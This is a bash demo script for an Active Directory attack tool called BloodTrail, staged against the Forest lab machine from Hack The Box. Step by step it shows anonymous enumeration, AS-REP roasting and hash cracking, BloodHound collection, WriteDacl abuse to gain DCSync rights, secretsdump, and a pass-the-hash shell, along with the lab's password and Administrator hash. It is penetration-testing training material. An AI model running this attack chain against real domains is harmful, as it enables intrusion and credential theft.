#!/bin/bash
# BloodTrail 3-Terminal Demo Script - Forest (HTB)
# Usage: ./demo.sh [-v]
#
# Options:
#   -v    Verbose mode - show streaming output from enumerators
#
# This demo uses 3 terminals:
# - Main (this script): Menu and orchestration
# - MANUAL (tmux: manual-demo): Shows raw commands
# - BLOODTRAIL (tmux: bloodtrail-demo): Shows BloodTrail output

# ═══════════════════════════════════════════════════════════════
# Colors
# ═══════════════════════════════════════════════════════════════
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

# ═══════════════════════════════════════════════════════════════
# Argument Parsing
# ═══════════════════════════════════════════════════════════════
VERBOSE_FLAG=""
while getopts "v" opt; do
    case $opt in
        v) VERBOSE_FLAG="-v" ;;
        *) echo "Usage: $0 [-v]"; exit 1 ;;
    esac
done

# ═══════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# demonstrations/02-bloodtrail -> go up 2 levels to crack/
CRACK_DIR="$(dirname "$(dirname "$SCRIPT_DIR")")"

# Forest target configuration
FOREST_IP="${FOREST_IP:-10.10.10.161}"
DOMAIN="htb.local"
DC_IP="$FOREST_IP"

# Credentials (discovered during demo)
CRED_USER="svc-alfresco"
CRED_PASS="s3rvice"
CRED_UPN="SVC-ALFRESCO@HTB.LOCAL"

# Change to crack directory
cd "$CRACK_DIR" || exit 1

# ═══════════════════════════════════════════════════════════════
# Neo4j Detection
# ═══════════════════════════════════════════════════════════════
check_neo4j() {
    if command -v nc &>/dev/null; then
        nc -z localhost 7687 2>/dev/null && return 0
    elif command -v curl &>/dev/null; then
        curl -s --connect-timeout 1 http://localhost:7474 &>/dev/null && return 0
    fi
    return 1
}

if check_neo4j; then
    NEO4J_STATUS="${GREEN}connected${NC}"
else
    NEO4J_STATUS="${RED}not running${NC}"
fi

# ═══════════════════════════════════════════════════════════════
# tmux Session Management
# ═══════════════════════════════════════════════════════════════

MANUAL_SESSION="manual-demo"
BLOODTRAIL_SESSION="bloodtrail-demo"

init_sessions() {
    # Kill any existing sessions
    tmux kill-session -t "$MANUAL_SESSION" 2>/dev/null
    tmux kill-session -t "$BLOODTRAIL_SESSION" 2>/dev/null

    # Create new detached sessions
    tmux new-session -d -s "$MANUAL_SESSION"
    tmux new-session -d -s "$BLOODTRAIL_SESSION"

    # Change to crack directory in both
    tmux send-keys -t "$MANUAL_SESSION" "cd '$CRACK_DIR'" Enter
    tmux send-keys -t "$BLOODTRAIL_SESSION" "cd '$CRACK_DIR'" Enter

    # Set clean, simple prompts (no colors - they break via tmux send-keys)
    tmux send-keys -t "$MANUAL_SESSION" 'export PS1="manual$ "' Enter
    tmux send-keys -t "$BLOODTRAIL_SESSION" 'export PS1="bloodtrail$ "' Enter

    # Initial clear
    sleep 0.3
    tmux send-keys -t "$MANUAL_SESSION" "clear" Enter
    tmux send-keys -t "$BLOODTRAIL_SESSION" "clear" Enter

    # Display waiting message
    sleep 0.1
    tmux send-keys -t "$MANUAL_SESSION" 'echo -e "\n\033[1;33m  ═══ MANUAL COMMANDS ═══\033[0m\n\n  Waiting for demo selection..."' Enter
    tmux send-keys -t "$BLOODTRAIL_SESSION" 'echo -e "\n\033[1;32m  ═══ BLOODTRAIL OUTPUT ═══\033[0m\n\n  Waiting for demo selection..."' Enter
}

cleanup() {
    echo -e "\n${DIM}Cleaning up tmux sessions...${NC}"
    tmux kill-session -t "$MANUAL_SESSION" 2>/dev/null
    tmux kill-session -t "$BLOODTRAIL_SESSION" 2>/dev/null
    echo -e "${GREEN}Sessions terminated.${NC}\n"
}

trap cleanup EXIT INT TERM

send_manual() {
    tmux send-keys -t "$MANUAL_SESSION" "$1" Enter
}

send_bloodtrail() {
    tmux send-keys -t "$BLOODTRAIL_SESSION" "$1" Enter
}

clear_sessions() {
    local manual_title="${1:-MANUAL COMMANDS}"
    local bt_title="${2:-BLOODTRAIL OUTPUT}"

    # Send Ctrl+C to kill any running commands
    tmux send-keys -t "$MANUAL_SESSION" C-c
    tmux send-keys -t "$BLOODTRAIL_SESSION" C-c
    sleep 0.3

    send_manual "clear"
    send_bloodtrail "clear"
    sleep 0.1
    send_manual "echo -e '\n\033[1;33m  ═══ $manual_title ═══\033[0m\n'"
    send_bloodtrail "echo -e '\n\033[1;32m  ═══ $bt_title ═══\033[0m\n'"
    sleep 0.2
}

# ═══════════════════════════════════════════════════════════════
# Helper Functions
# ═══════════════════════════════════════════════════════════════

print_header() {
    echo -e "\n${RED}${BOLD}$1${NC}"
    echo -e "${RED}$(printf '═%.0s' {1..60})${NC}\n"
}

print_phase() {
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│${NC}  ${BOLD}PHASE $1: $2${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

wait_for_input() {
    echo ""
    echo -e "${DIM}Press Enter to continue, or 'q' to return to menu...${NC}"
    read -r response
    if [[ "$response" == "q" || "$response" == "Q" ]]; then
        return 1
    fi
    return 0
}

# ═══════════════════════════════════════════════════════════════
# Demo Functions - Forest Attack Path
# ═══════════════════════════════════════════════════════════════

demo_phase1() {
    clear_sessions "ANONYMOUS ENUMERATION" "BLOODTRAIL PRE-AUTH"

    # Manual commands
    send_manual "echo '# Multiple tools required for anonymous enumeration'"
    send_manual "echo ''"
    send_manual "echo '# 1. RPC user enumeration'"
    send_manual "echo 'rpcclient -U \"\" -N $FOREST_IP -c enumdomusers'"
    send_manual "echo ''"
    send_manual "echo '# 2. LDAP enumeration'"
    send_manual "echo 'ldapsearch -x -H ldap://$FOREST_IP -b \"DC=htb,DC=local\"'"
    send_manual "echo ''"
    send_manual "echo '# 3. Password policy'"
    send_manual "echo 'crackmapexec smb $FOREST_IP --pass-pol'"
    send_manual "echo ''"
    send_manual "echo '# 4. AS-REP roastable users (need username list first)'"
    send_manual "echo 'GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -usersfile users.txt -format hashcat'"

    # BloodTrail command
    send_bloodtrail "echo '# Single command does everything:'"
    send_bloodtrail "echo ''"
    send_bloodtrail "crack bloodtrail $FOREST_IP $VERBOSE_FLAG"

    # Main terminal
    clear
    print_header "PHASE 1: Anonymous Enumeration"
    print_phase "1" "Anonymous Enumeration"

    echo -e "${YELLOW}The Challenge:${NC}"
    echo "  Find attack vectors without any credentials"
    echo ""
    echo -e "${YELLOW}Manual Approach (4+ commands):${NC}"
    echo -e "  ${DIM}1. rpcclient -U '' -N $FOREST_IP -c 'enumdomusers'${NC}"
    echo -e "  ${DIM}2. ldapsearch -x -H ldap://$FOREST_IP ...${NC}"
    echo -e "  ${DIM}3. crackmapexec smb $FOREST_IP --pass-pol${NC}"
    echo -e "  ${DIM}4. GetNPUsers.py ... (need user list first)${NC}"
    echo ""
    echo -e "${GREEN}BloodTrail (1 command):${NC}"
    echo -e "  ${GREEN}crack bloodtrail $FOREST_IP${NC}"
    echo ""
    echo -e "${MAGENTA}BloodTrail Discovers:${NC}"
    echo -e "  ${MAGENTA}*${NC} Password policy (lockout threshold, complexity)"
    echo -e "  ${MAGENTA}*${NC} AS-REP roastable users - ${YELLOW}svc-alfresco${NC}"
    echo -e "  ${MAGENTA}*${NC} Domain users for password spraying"
    echo -e "  ${MAGENTA}*${NC} Ready hashcat command for cracking"

    wait_for_input
}

demo_phase2() {
    clear_sessions "AS-REP ROASTING" "BLOODTRAIL (Already Done)"

    # Manual commands
    send_manual "echo '# Get the AS-REP hash manually'"
    send_manual "echo 'GetNPUsers.py $DOMAIN/$CRED_USER -dc-ip $DC_IP -no-pass -format hashcat'"
    send_manual "echo ''"
    send_manual "echo '# Then crack with hashcat'"
    send_manual "echo 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt'"
    send_manual "echo ''"
    send_manual "echo '# Result: $CRED_USER:$CRED_PASS'"

    # BloodTrail
    send_bloodtrail "echo '# BloodTrail already discovered this in Phase 1!'"
    send_bloodtrail "echo ''"
    send_bloodtrail "echo 'AS-REP hash was captured during enumeration.'"
    send_bloodtrail "echo 'Hashcat command was provided in output.'"
    send_bloodtrail "echo ''"
    send_bloodtrail "echo -e '\\033[1;32mCracked: $CRED_USER:$CRED_PASS\\033[0m'"

    # Main terminal
    clear
    print_header "PHASE 2: AS-REP Roasting"
    print_phase "2" "AS-REP Roasting"

    echo -e "${YELLOW}The Discovery:${NC}"
    echo "  svc-alfresco has Kerberos pre-authentication disabled"
    echo ""
    echo -e "${YELLOW}Manual Approach:${NC}"
    echo -e "  ${DIM}1. GetNPUsers.py $DOMAIN/$CRED_USER -dc-ip $DC_IP -no-pass${NC}"
    echo -e "  ${DIM}2. hashcat -m 18200 asrep.hash rockyou.txt${NC}"
    echo -e "  ${DIM}3. Wait... interpret output... find password${NC}"
    echo ""
    echo -e "${GREEN}BloodTrail:${NC}"
    echo "  Already captured the hash in Phase 1!"
    echo "  Hashcat command was ready to copy-paste."
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}CRACKED CREDENTIAL:${NC}"
    echo -e "  ${GREEN}$CRED_USER : $CRED_PASS${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    wait_for_input
}

demo_phase3() {
    clear_sessions "CREDENTIAL VALIDATION" "BLOODTRAIL PIPELINE"

    # Manual commands
    send_manual "echo '# 1. Validate credentials'"
    send_manual "echo 'crackmapexec smb $FOREST_IP -u $CRED_USER -p $CRED_PASS'"
    send_manual "echo ''"
    send_manual "echo '# 2. Collect BloodHound data'"
    send_manual "echo 'bloodhound-python -d $DOMAIN -u $CRED_USER -p $CRED_PASS -c all -ns $DC_IP'"
    send_manual "echo ''"
    send_manual "echo '# 3. Open BloodHound GUI'"
    send_manual "echo '# 4. Import the ZIP file'"
    send_manual "echo '# 5. Mark user as Owned'"
    send_manual "echo '# 6. Run Shortest Path to Domain Admin query'"

    # BloodTrail
    send_bloodtrail "echo '# One command does everything:'"
    send_bloodtrail "echo ''"
    send_bloodtrail "crack bloodtrail $FOREST_IP --creds '$CRED_USER:$CRED_PASS' $VERBOSE_FLAG"

    # Main terminal
    clear
    print_header "PHASE 3: Credential Pipeline"
    print_phase "3" "Credential Pipeline"

    echo -e "${YELLOW}The Situation:${NC}"
    echo "  We have valid credentials: $CRED_USER:$CRED_PASS"
    echo "  Need to: validate, collect BloodHound, import, analyze"
    echo ""
    echo -e "${YELLOW}Manual Approach (6 steps):${NC}"
    echo -e "  ${DIM}1. crackmapexec smb ... (validate)${NC}"
    echo -e "  ${DIM}2. bloodhound-python ... (collect)${NC}"
    echo -e "  ${DIM}3. Open BloodHound GUI${NC}"
    echo -e "  ${DIM}4. Click 'Upload Data' -> select ZIP${NC}"
    echo -e "  ${DIM}5. Right-click user -> Mark as Owned${NC}"
    echo -e "  ${DIM}6. Run 'Shortest Path to Domain Admin'${NC}"
    echo ""
    echo -e "${GREEN}BloodTrail (1 command):${NC}"
    echo -e "  ${GREEN}crack bloodtrail $FOREST_IP --creds '$CRED_USER:$CRED_PASS'${NC}"
    echo ""
    echo -e "${MAGENTA}Pipeline Automation:${NC}"
    echo -e "  ${MAGENTA}1.${NC} Validates credential against SMB"
    echo -e "  ${MAGENTA}2.${NC} Collects BloodHound data (all methods)"
    echo -e "  ${MAGENTA}3.${NC} Imports to Neo4j automatically"
    echo -e "  ${MAGENTA}4.${NC} Marks user as Pwned"
    echo -e "  ${MAGENTA}5.${NC} Runs attack path queries"
    echo -e "  ${MAGENTA}6.${NC} Generates ready-to-run commands"

    wait_for_input
}

demo_phase4() {
    clear_sessions "BLOODHOUND ANALYSIS" "BLOODTRAIL ATTACK PATHS"

    # Manual commands
    send_manual "echo '# In BloodHound GUI:'"
    send_manual "echo ''"
    send_manual "echo '1. Search: $CRED_UPN'"
    send_manual "echo '2. Right-click -> Mark as Owned'"
    send_manual "echo '3. Queries -> Shortest Path to Domain Admin'"
    send_manual "echo '4. Read the graph...'"
    send_manual "echo '5. Research each edge type...'"
    send_manual "echo '6. Find commands for each step...'"

    # BloodTrail
    send_bloodtrail "echo '# Show attack paths with ready commands:'"
    send_bloodtrail "echo ''"
    send_bloodtrail "crack bloodtrail --pwned-user '$CRED_UPN'"

    # Main terminal
    clear
    print_header "PHASE 4: Attack Path Discovery"
    print_phase "4" "Attack Path Discovery"

    echo -e "${YELLOW}The Goal:${NC}"
    echo "  Find path from svc-alfresco to Domain Admin"
    echo ""
    echo -e "${YELLOW}Forest Attack Path:${NC}"
    echo ""
    echo -e "  ${GREEN}$CRED_UPN${NC}"
    echo -e "      ${DIM}|${NC}"
    echo -e "      ${DIM}| MemberOf${NC}"
    echo -e "      ${DIM}v${NC}"
    echo -e "  ${BLUE}SERVICE ACCOUNTS@HTB.LOCAL${NC}"
    echo -e "      ${DIM}|${NC}"
    echo -e "      ${DIM}| MemberOf${NC}"
    echo -e "      ${DIM}v${NC}"
    echo -e "  ${BLUE}PRIVILEGED IT ACCOUNTS@HTB.LOCAL${NC}"
    echo -e "      ${DIM}|${NC}"
    echo -e "      ${DIM}| MemberOf${NC}"
    echo -e "      ${DIM}v${NC}"
    echo -e "  ${YELLOW}ACCOUNT OPERATORS@HTB.LOCAL${NC}"
    echo -e "      ${DIM}|${NC}"
    echo -e "      ${DIM}| GenericAll${NC}"
    echo -e "      ${DIM}v${NC}"
    echo -e "  ${YELLOW}EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL${NC}"
    echo -e "      ${DIM}|${NC}"
    echo -e "      ${DIM}| WriteDacl${NC}"
    echo -e "      ${DIM}v${NC}"
    echo -e "  ${RED}HTB.LOCAL (Domain)${NC}"
    echo ""
    echo -e "${GREEN}BloodTrail provides:${NC}"
    echo -e "  ${GREEN}*${NC} Visual path representation"
    echo -e "  ${GREEN}*${NC} Ready commands for each edge"
    echo -e "  ${GREEN}*${NC} Priority-ordered attack steps"

    wait_for_input
}

demo_phase5() {
    clear_sessions "MANUAL EXPLOITATION" "BLOODTRAIL POST-EXPLOIT"

    # Manual commands
    send_manual "echo '# Research and execute each step:'"
    send_manual "echo ''"
    send_manual "echo '# 1. Add computer (Account Operators can do this)'"
    send_manual "echo 'impacket-addcomputer -dc-ip $DC_IP -computer-name YOURPC -computer-pass P@ssw0rd'"
    send_manual "echo ''"
    send_manual "echo '# 2. Add to Exchange Windows Permissions (GenericAll)'"
    send_manual "echo 'net group \"Exchange Windows Permissions\" YOURPC\$ /add'"
    send_manual "echo ''"
    send_manual "echo '# 3. Grant DCSync rights (WriteDacl)'"
    send_manual "echo 'bloodyAD add dcsync YOURPC\$'"
    send_manual "echo ''"
    send_manual "echo '# 4. DCSync to get Administrator hash'"
    send_manual "echo 'secretsdump.py YOURPC\$:P@ssw0rd@$DC_IP -just-dc-user Administrator'"

    # BloodTrail
    send_bloodtrail "echo '# All commands ready, priority-ordered:'"
    send_bloodtrail "echo ''"
    send_bloodtrail "crack bloodtrail --post-exploit"

    # Main terminal
    clear
    print_header "PHASE 5: Exploitation"
    print_phase "5" "WriteDACL -> DCSync"

    echo -e "${YELLOW}The Path:${NC}"
    echo "  GenericAll on Exchange Windows Permissions"
    echo "  -> Add self to group"
    echo "  -> WriteDacl on domain"
    echo "  -> Grant DCSync rights"
    echo ""
    echo -e "${YELLOW}Manual Approach:${NC}"
    echo -e "  ${DIM}1. Research: What can I do with GenericAll on a group?${NC}"
    echo -e "  ${DIM}2. Research: How to abuse WriteDacl?${NC}"
    echo -e "  ${DIM}3. Find impacket/bloodyAD commands...${NC}"
    echo ""
    echo -e "${GREEN}BloodTrail --post-exploit provides:${NC}"
    echo ""
    echo -e "  ${GREEN}1.${NC} impacket-addcomputer -dc-ip $DC_IP -computer-name 'YOURPC' -computer-pass 'P@ssw0rd'"
    echo ""
    echo -e "  ${GREEN}2.${NC} bloodyAD -d $DOMAIN add groupMember 'EXCHANGE WINDOWS PERMISSIONS' 'YOURPC\$'"
    echo ""
    echo -e "  ${GREEN}3.${NC} bloodyAD -d $DOMAIN add dcsync 'YOURPC\$'"
    echo ""
    echo -e "  ${GREEN}4.${NC} secretsdump.py '$DOMAIN/YOURPC\$:P@ssw0rd'@$DC_IP -just-dc-user Administrator"

    wait_for_input
}

demo_phase6() {
    clear_sessions "DCSYNC COMPLETE" "BLOODTRAIL VICTORY"

    # Manual commands
    send_manual "echo '# DCSync successful!'"
    send_manual "echo ''"
    send_manual "echo 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::'"
    send_manual "echo ''"
    send_manual "echo '# Pass-the-hash to get shell'"
    send_manual "echo 'wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@$FOREST_IP'"

    # BloodTrail
    send_bloodtrail "echo '# Track the complete attack chain:'"
    send_bloodtrail "echo ''"
    send_bloodtrail "echo '# Mark Administrator as pwned'"
    send_bloodtrail "echo 'crack bloodtrail --pwn ADMINISTRATOR@HTB.LOCAL --cred-type ntlm-hash --cred-value <hash>'"
    send_bloodtrail "echo ''"
    send_bloodtrail "crack bloodtrail --list-pwned"

    # Main terminal
    clear
    print_header "PHASE 6: Domain Admin!"
    print_phase "6" "Victory!"

    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}  DOMAIN ADMIN ACHIEVED!${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${YELLOW}Complete Attack Chain:${NC}"
    echo ""
    echo -e "  ${DIM}Anonymous${NC} --> ${GREEN}AS-REP${NC} --> ${GREEN}svc-alfresco${NC}"
    echo -e "                            |"
    echo -e "                            v"
    echo -e "                     ${YELLOW}Account Operators${NC}"
    echo -e "                            |"
    echo -e "                            | GenericAll"
    echo -e "                            v"
    echo -e "                  ${YELLOW}Exchange Windows Permissions${NC}"
    echo -e "                            |"
    echo -e "                            | WriteDacl"
    echo -e "                            v"
    echo -e "                      ${RED}DCSync Rights${NC}"
    echo -e "                            |"
    echo -e "                            v"
    echo -e "                 ${RED}${BOLD}ADMINISTRATOR@HTB.LOCAL${NC}"
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${YELLOW}TIME COMPARISON:${NC}"
    echo -e "  Manual approach:    ${RED}~45 minutes${NC}"
    echo -e "  With BloodTrail:    ${GREEN}~15 minutes${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    wait_for_input
}

demo_queries() {
    clear_sessions "NEO4J QUERIES" "BLOODTRAIL QUERY LIBRARY"

    # Manual
    send_manual "echo '# BloodHound has built-in queries...'"
    send_manual "echo '# But BloodTrail has 63+ specialized queries!'"

    # BloodTrail
    send_bloodtrail "crack bloodtrail --list-queries | head -40"

    # Main terminal
    clear
    print_header "BONUS: Query Library"

    echo -e "${YELLOW}BloodTrail Query Categories:${NC}"
    echo ""
    echo -e "  ${MAGENTA}*${NC} ${WHITE}quick_wins${NC} - AS-REP, Kerberoast, delegation"
    echo -e "  ${MAGENTA}*${NC} ${WHITE}lateral_movement${NC} - AdminTo, RDP, sessions"
    echo -e "  ${MAGENTA}*${NC} ${WHITE}privilege_escalation${NC} - DCSync, GenericAll, WriteDacl"
    echo -e "  ${MAGENTA}*${NC} ${WHITE}attack_chains${NC} - Multi-hop paths to DA"
    echo -e "  ${MAGENTA}*${NC} ${WHITE}adcs${NC} - Certificate abuse (ESC1-ESC8)"
    echo -e "  ${MAGENTA}*${NC} ${WHITE}delegation${NC} - Constrained/unconstrained"
    echo ""
    echo -e "${YELLOW}Commands:${NC}"
    echo -e "  ${GREEN}crack bloodtrail --list-queries${NC}"
    echo -e "  ${GREEN}crack bloodtrail --search-query kerberos${NC}"
    echo -e "  ${GREEN}crack bloodtrail --run-query quick-asrep-roastable${NC}"
    echo -e "  ${GREEN}crack bloodtrail --run-all  ${DIM}# Generate full report${NC}"

    wait_for_input
}

run_all() {
    demo_phase1
    demo_phase2
    demo_phase3
    demo_phase4
    demo_phase5
    demo_phase6
    demo_queries

    clear
    print_header "DEMO COMPLETE"

    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}  All BloodTrail phases demonstrated!${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo "Key takeaways:"
    echo -e "  ${MAGENTA}*${NC} Single command replaces multiple tools"
    echo -e "  ${MAGENTA}*${NC} Attack paths come with ready commands"
    echo -e "  ${MAGENTA}*${NC} Credential pipeline automates grunt work"
    echo -e "  ${MAGENTA}*${NC} 63+ queries for comprehensive coverage"
    echo ""
    echo "For more information:"
    echo -e "  ${CYAN}crack bloodtrail --help${NC}"
    echo -e "  ${CYAN}crack bloodtrail --list-queries${NC}"

    wait_for_input
}

# ═══════════════════════════════════════════════════════════════
# Menu
# ═══════════════════════════════════════════════════════════════

show_menu() {
    clear
    # Blood red banner
    echo -e "${RED}"
    cat << 'EOF'

  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ████████╗██████╗  █████╗ ██╗██╗
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║██║
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║   ██║   ██████╔╝███████║██║██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║   ██║   ██╔══██╗██╔══██║██║██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝   ██║   ██║  ██║██║  ██║██║███████╗
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝

EOF
    echo -e "${NC}"
    echo -e "  ${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${DIM}Follow the blood. Find the path. Claim the crown.${NC}"
    echo -e "  ${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    # Attach instructions
    echo -e "  ${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "  ${CYAN}│${NC}  ${BOLD}ATTACH DEMO TERMINALS:${NC}                                 ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}                                                         ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${YELLOW}Terminal 2:${NC}  tmux attach -t manual-demo                ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${YELLOW}Terminal 3:${NC}  tmux attach -t bloodtrail-demo            ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${YELLOW}Terminal 4:${NC}  Open BloodHound GUI                       ${CYAN}│${NC}"
    echo -e "  ${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "                                          ${DIM}Neo4j:${NC} $NEO4J_STATUS"
    echo -e "                                          ${DIM}Target:${NC} ${YELLOW}$FOREST_IP${NC}"
    echo ""

    echo -e "${BOLD}${WHITE}  FOREST (HTB) ATTACK PHASES ${DIM}─────────────────────────────────${NC}"
    echo -e "  ${RED}1)${NC} Anonymous Enumeration   ${DIM}AS-REP discovery without creds${NC}"
    echo -e "  ${RED}2)${NC} AS-REP Roasting         ${DIM}Crack svc-alfresco hash${NC}"
    echo -e "  ${RED}3)${NC} Credential Pipeline     ${DIM}Validate -> Collect -> Import${NC}"
    echo -e "  ${RED}4)${NC} Attack Path Discovery   ${DIM}Find path to Domain Admin${NC}"
    echo -e "  ${RED}5)${NC} Exploitation            ${DIM}WriteDACL -> DCSync${NC}"
    echo -e "  ${RED}6)${NC} Domain Admin            ${DIM}Victory!${NC}"
    echo ""
    echo -e "${BOLD}${WHITE}  BONUS ${DIM}──────────────────────────────────────────────────────${NC}"
    echo -e "  ${CYAN}7)${NC} Query Library           ${DIM}63+ attack queries${NC}"
    echo ""
    echo -e "  ${MAGENTA}0)${NC} Run All                 ${DIM}Complete walkthrough${NC}"
    echo -e "  ${WHITE}q)${NC} Quit"
    echo ""
    echo -n "  Enter selection: "
}

# ═══════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════

# Check for tmux
if ! command -v tmux &>/dev/null; then
    echo -e "${RED}Error: tmux is required for this demo${NC}"
    echo "Install with: sudo apt install tmux"
    exit 1
fi

# Check for NEO4J_PASSWORD
if [ -z "$NEO4J_PASSWORD" ]; then
    echo -e "${YELLOW}Warning: NEO4J_PASSWORD not set${NC}"
    echo ""
    echo "Neo4j commands will fail without this. Add to your shell rc file:"
    echo -e "  ${CYAN}echo \"export NEO4J_PASSWORD='YourPassword'\" >> ~/.bashrc${NC}"
    echo -e "  ${CYAN}echo \"export NEO4J_PASSWORD='YourPassword'\" >> ~/.zshrc${NC}"
    echo ""
    echo "Then start a new terminal or run: source ~/.bashrc"
    echo ""
    read -p "Continue anyway? [y/N] " -r
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Initialize sessions
echo -e "${CYAN}Initializing demo sessions...${NC}"
init_sessions
echo -e "${GREEN}Sessions ready!${NC}"
sleep 0.5

# Interactive menu
while true; do
    show_menu
    read -r -t 0.1 -n 10000 discard 2>/dev/null || true
    read -r choice

    case "$choice" in
        1) demo_phase1 ;;
        2) demo_phase2 ;;
        3) demo_phase3 ;;
        4) demo_phase4 ;;
        5) demo_phase5 ;;
        6) demo_phase6 ;;
        7) demo_queries ;;
        0) run_all ;;
        q|Q) echo -e "\n${GREEN}Goodbye!${NC}"; exit 0 ;;
        *) echo -e "\n${RED}Invalid option${NC}"; sleep 1 ;;
    esac
done
